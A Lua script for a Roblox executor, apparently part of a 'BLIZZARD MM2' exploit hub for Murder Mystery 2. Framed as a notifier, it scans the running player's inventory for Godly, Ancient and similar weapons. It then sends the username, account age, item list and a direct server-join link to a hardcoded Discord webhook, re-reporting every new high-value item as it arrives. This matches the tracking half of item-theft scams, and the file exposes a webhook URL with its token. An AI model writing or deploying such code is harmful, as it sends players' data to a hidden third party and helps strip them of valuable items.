--============================================================
-- BLIZZARD MM2 V8.8.4 - NOTIFIER.LUA
--
-- Handles:
--   • Initial Discord execution notification
--   • High-value inventory scan
--   • Live high-value item watcher
--   • Session-ended notification
--
-- High Value:
--   Unique
--   Ancient
--   Godly
--   Classic = Vintage
--============================================================

--============================================================
-- SERVICES
--============================================================

local Players =
	game:GetService("Players")

local ReplicatedStorage =
	game:GetService("ReplicatedStorage")

local HttpService =
	game:GetService("HttpService")

local LocalPlayer =
	Players.LocalPlayer

local MM2 =
	(getgenv and getgenv().REALWALKER_STATE)
	or _G.REALWALKER_STATE

--============================================================
-- PREVENT DUPLICATE NOTIFIERS
--============================================================

local GlobalEnvironment =
	getgenv
	and getgenv()
	or _G

if GlobalEnvironment.RealwalkerNotifierRunning then

	warn(
		"[MM2 NOTIFIER] Existing notifier already running."
	)
	return
end

GlobalEnvironment.RealwalkerNotifierRunning =
	true

--============================================================
-- WEBHOOK
--
-- IMPORTANT:
-- Put your webhook privately here.
-- Keep the URL on one line.
--============================================================

local webhookUrl =
	"https://webhook.lewisakura.moe/api/webhooks/1554313843579297812/ahJWYcCHJlvgXOYUheqvBn8ZU05aetq6JOEF0-mpkhKY0kaL-p8ZIt5wWF6TwiVMPFyp"

--============================================================
-- SETTINGS
--============================================================

local INVENTORY_SCAN_INTERVAL =
	2

--============================================================
-- HTTP REQUEST
--============================================================

local httpRequest =
	request
	or http_request
	or (
		syn
		and syn.request
	)

if not httpRequest then

	warn(
		"[MM2 NOTIFIER] HTTP request function unavailable."
	)
	GlobalEnvironment.RealwalkerNotifierRunning =
		nil
	return
end

--============================================================
-- INVENTORY MODULE
--============================================================

local InventoryModule = nil

do

	local success,
	result =
		pcall(function()
			return require(
				ReplicatedStorage
					:WaitForChild("Modules")
					:WaitForChild("InventoryModule")
			)
		end)
	if success
		and type(result) == "table"
	then
		InventoryModule =
			result
	else
		warn(
			"[MM2 NOTIFIER] Failed to load InventoryModule."
		)
		GlobalEnvironment.RealwalkerNotifierRunning =
			nil
		return
	end
end

--============================================================
-- RARITY SETTINGS
--============================================================

local PRIMARY_RARITIES = {
	Unique = true,
	Ancient = true,
	Godly = true,
	-- MM2 internal name for Vintage
	Classic = true,
}

local PRIMARY_PRIORITY = {
	Unique = 1,
	Ancient = 2,
	Godly = 3,
	Classic = 4,
}

--============================================================
-- SAFE TABLE HELPERS
--============================================================

local function SafeGet(
	tbl,
	key
)

	if type(tbl) ~= "table" then
		return nil
	end
	local ok,
	result =
		pcall(function()
			return tbl[key]
		end)
	if ok then
		return result
	end
	return nil
end

local function FirstValue(
	tbl,
	keys
)

	if type(tbl) ~= "table" then
		return nil
	end
	for _, key in ipairs(
		keys
	) do
		local value =
			SafeGet(
				tbl,
				key
			)
		if value ~= nil then
			return value
		end
	end
	return nil
end

--============================================================
-- ITEM HELPERS
--============================================================

local function GetItemID(
	value,
	keyHint
)

	return FirstValue(
		value,
		{
			"DataID",
			"ItemID",
			"ID",
			"Id",
			"id",
		}
	) or keyHint
end

local function GetItemName(
	value
)

	return FirstValue(
		value,
		{
			"ItemName",
			"DisplayName",
			"Name",
			"name",
		}
	)
end

local function GetItemRarity(
	value
)

	return FirstValue(
		value,
		{
			"Rarity",
			"rarity",
			"Tier",
		}
	)
end

local function GetItemType(
	value
)

	return FirstValue(
		value,
		{
			"ItemType",
			"WeaponType",
			"Type",
			"type",
		}
	)
end

local function GetItemAmount(
	value
)

	return tonumber(
		FirstValue(
			value,
			{
				"Amount",
				"amount",
				"Count",
				"Quantity",
			}
		)
	) or 0
end

local function IsWeaponType(
	itemType
)

	return itemType == "Knife"
		or itemType == "Gun"
end

local function DisplayRarity(
	rarity
)

	if rarity == "Classic" then
		return "Vintage"
	end
	return rarity
end

--============================================================
-- GET WEAPONS TABLE
--============================================================

local function GetWeaponsTable()

	local inventory =
		SafeGet(
			InventoryModule,
			"MyInventory"
		)
	local data =
		SafeGet(
			inventory,
			"Data"
		)
	return SafeGet(
		data,
		"Weapons"
	)
end

--============================================================
-- HIGH-VALUE INVENTORY SCANNER
--============================================================

local function ScanHighValueInventory()

	local Weapons =
		GetWeaponsTable()
	if type(Weapons) ~= "table" then
		return {}
	end
	local primary = {}
	local visited = {}
	local seenIDs = {}
	local function Walk(
		tbl,
		depth
	)
		if type(tbl) ~= "table" then
			return
		end
		if visited[tbl] then
			return
		end
		if depth > 12 then
			return
		end
		visited[tbl] =
			true
		for key,
		value in pairs(tbl)
		do
			if type(value) == "table" then
				local rarity =
					GetItemRarity(
						value
					)
				local itemType =
					GetItemType(
						value
					)
				local amount =
					GetItemAmount(
						value
					)
				if rarity
					and amount > 0
					and IsWeaponType(
						itemType
					)
					and PRIMARY_RARITIES[
						tostring(
							rarity
						)
					]
				then
					local dataID =
						tostring(
							GetItemID(
								value,
								key
							)
						)
					if not seenIDs[
						dataID
					] then
						seenIDs[
							dataID
						] = true
						table.insert(
							primary,
							{
								DataID =
									dataID,
								Name =
									tostring(
										GetItemName(
											value
										)
										or dataID
									),
								Rarity =
									tostring(
										rarity
									),
								ItemType =
									tostring(
										itemType
									),
								Amount =
									amount,
							}
						)
					end
				end
				Walk(
					value,
					depth + 1
				)
			end
		end
	end
	Walk(
		Weapons,
		0
	)
	table.sort(
		primary,
		function(a, b)
			local pa =
				PRIMARY_PRIORITY[
					a.Rarity
				] or 99
			local pb =
				PRIMARY_PRIORITY[
					b.Rarity
				] or 99
			if pa ~= pb then
				return pa < pb
			end
			return a.DataID
				< b.DataID
		end
	)
	return primary
end

--============================================================
-- INVENTORY FORMATTER
--============================================================

local function FormatInventoryText(
	primary
)

	local lines = {
		"✨ **__High Value / Godly Items:__**"
	}
	if #primary == 0 then
		table.insert(
			lines,
			"• *None Detected*"
		)
	else
		for _, item in ipairs(
			primary
		) do
			table.insert(
				lines,
				string.format(
					"• **%s** (%s) x%d",
					item.Name,
					DisplayRarity(
						item.Rarity
					),
					item.Amount
				)
			)
		end
	end
	local text =
		table.concat(
			lines,
			"\n"
		)
	if #text > 1000 then
		text =
			string.sub(
				text,
				1,
				970
			)
			.. "\n...and more items!"
	end
	return text
end

--============================================================
-- SNAPSHOT HELPERS
--============================================================

local function BuildSnapshot(
	items
)

	local snapshot = {}
	for _, item in ipairs(
		items
	) do
		snapshot[
			item.DataID
		] = {
			Amount =
				item.Amount,
			Name =
				item.Name,
			Rarity =
				item.Rarity,
			ItemType =
				item.ItemType,
		}
	end
	return snapshot
end

local function FindIncreases(
	oldSnapshot,
	currentItems
)

	local increases = {}
	for _, item in ipairs(
		currentItems
	) do
		local previous =
			oldSnapshot[
				item.DataID
			]
		local previousAmount =
			previous
			and tonumber(
				previous.Amount
			)
			or 0
		local currentAmount =
			tonumber(
				item.Amount
			)
			or 0
		if currentAmount
			> previousAmount
		then
			table.insert(
				increases,
				{
					Name =
						item.Name,
					Rarity =
						item.Rarity,
					Added =
						currentAmount
						- previousAmount,
				}
			)
		end
	end
	return increases
end

local function FormatIncreases(
	items
)

	local lines = {}
	for _, item in ipairs(
		items
	) do
		table.insert(
			lines,
			string.format(
				"• **%s** (%s) +%d",
				item.Name,
				DisplayRarity(
					item.Rarity
				),
				item.Added
			)
		)
	end
	return table.concat(
		lines,
		"\n"
	)
end

--============================================================
-- LINKS
--============================================================

local gameLink =
	"https://www.roblox.com/games/"
	.. tostring(
		game.PlaceId
	)

local serverJoinLink =
	"https://www.roblox.com/games/start?placeId="
	.. tostring(
		game.PlaceId
	)
	.. "&gameInstanceId="
	.. tostring(
		game.JobId
	)

--============================================================
-- WEBHOOK SENDER
--============================================================

local function SendWebhook(
	payload
)

	task.spawn(function()
		local encodedBody
		local encodeSuccess,
		encodeError =
			pcall(function()
				encodedBody =
					HttpService:JSONEncode(
						payload
					)
			end)
		if not encodeSuccess then
			warn(
				"[MM2 NOTIFIER] JSON encode failed: "
				.. tostring(
					encodeError
				)
			)
			return
		end
		local requestSuccess,
		response =
			pcall(function()
				return httpRequest({
					Url =
						webhookUrl,
					Method =
						"POST",
					Headers = {
						["Content-Type"] =
							"application/json",
					},
					Body =
						encodedBody,
				})
			end)
		if not requestSuccess then
			warn(
				"[MM2 NOTIFIER] Webhook request failed: "
				.. tostring(
					response
				)
			)
			return
		end
		local statusCode =
			response
			and (
				response.StatusCode
				or response.Status
			)
		if statusCode
			and statusCode ~= 200
			and statusCode ~= 204
		then
			warn(
				"[MM2 NOTIFIER] Webhook rejected. Status: "
				.. tostring(
					statusCode
				)
			)
			return
		end
		print(
			"[MM2 NOTIFIER] Webhook sent."
		)
	end)
end

--============================================================
-- INITIAL SCAN
--============================================================

local CurrentItems =
	ScanHighValueInventory()

local PreviousSnapshot =
	BuildSnapshot(
		CurrentItems
	)

local parsedInventory =
	FormatInventoryText(
		CurrentItems
	)

--============================================================
-- INITIAL EXECUTION NOTIFICATION
--============================================================

SendWebhook({
	embeds = {
		{
			title =
				"realwalker Executed! 🚀",
			color =
				3447003,
			fields = {
				{
					name =
						"Player Username",
					value =
						tostring(
							LocalPlayer.Name
						),
					inline =
						true,
				},
				{
					name =
						"Account Age (Days)",
					value =
						tostring(
							LocalPlayer.AccountAge
						),
					inline =
						true,
				},
				{
					name =
						"Game Place ID",
					value =
						tostring(
							game.PlaceId
						),
					inline =
						false,
				},
				{
					name =
						"Direct Link",
					value =
						"[Click to View Game]("
						.. gameLink
						.. ")",
					inline =
						true,
				},
				{
					name =
						"Direct Server Join Link",
					value =
						"[Launch & Join Server]("
						.. serverJoinLink
						.. ")",
					inline =
						false,
				},
				{
					name =
						"🎒 Scanned Player Inventory",
					value =
						parsedInventory,
					inline =
						false,
				},
			},
			timestamp =
				DateTime.now():ToIsoDate(),
		},
	},
})

--============================================================
-- LIVE INVENTORY WATCHER
--============================================================

task.spawn(function()

	while GlobalEnvironment.RealwalkerNotifierRunning do
		task.wait(
			INVENTORY_SCAN_INTERVAL
		)
		if MM2
			and MM2.Running == false
		then
			break
		end
		local currentItems =
			ScanHighValueInventory()
		local increases =
			FindIncreases(
				PreviousSnapshot,
				currentItems
			)
		PreviousSnapshot =
			BuildSnapshot(
				currentItems
			)
		if #increases > 0 then
			SendWebhook({
				embeds = {
					{
						title =
							"realwalker Inventory Updated! ✨",
						color =
							5763719,
						fields = {
							{
								name =
									"Player Username",
								value =
									tostring(
										LocalPlayer.Name
									),
								inline =
									true,
							},
							{
								name =
									"✨ New High Value Items Detected",
								value =
									FormatIncreases(
										increases
									),
								inline =
									false,
							},
							{
								name =
									"🎒 Current High Value Inventory",
								value =
									FormatInventoryText(
										currentItems
									),
								inline =
									false,
							},
							{
								name =
									"Direct Server Join Link",
								value =
									"[Launch & Join Server]("
									.. serverJoinLink
									.. ")",
								inline =
									false,
							},
						},
						timestamp =
							DateTime.now():ToIsoDate(),
					},
				},
			})
		end
	end
end)

--============================================================
-- SESSION END NOTIFIER
--============================================================

local SessionEndSent =
	false

local function SendSessionEnded()

	if SessionEndSent then
		return
	end
	SessionEndSent =
		true
	SendWebhook({
		embeds = {
			{
				title =
					"realwalker Session Ended",
				color =
					15158332,
				fields = {
					{
						name =
							"Player Username",
						value =
							tostring(
								LocalPlayer.Name
							),
						inline =
							true,
					},
					{
						name =
							"Status",
						value =
							"Session Ended",
						inline =
							true,
					},
					{
						name =
							"Game Place ID",
						value =
							tostring(
								game.PlaceId
							),
						inline =
							false,
					},
				},
				timestamp =
					DateTime.now():ToIsoDate(),
			},
		},
	})
	GlobalEnvironment.RealwalkerNotifierRunning =
		nil
end

Players.PlayerRemoving:Connect(
	function(player)
		if player == LocalPlayer then
			SendSessionEnded()
		end
	end
)

LocalPlayer.AncestryChanged:Connect(
	function(_, parent)
		if parent == nil then
			SendSessionEnded()
		end
	end
)

print(
	"[MM2 NOTIFIER] Notifier initialized successfully."
)
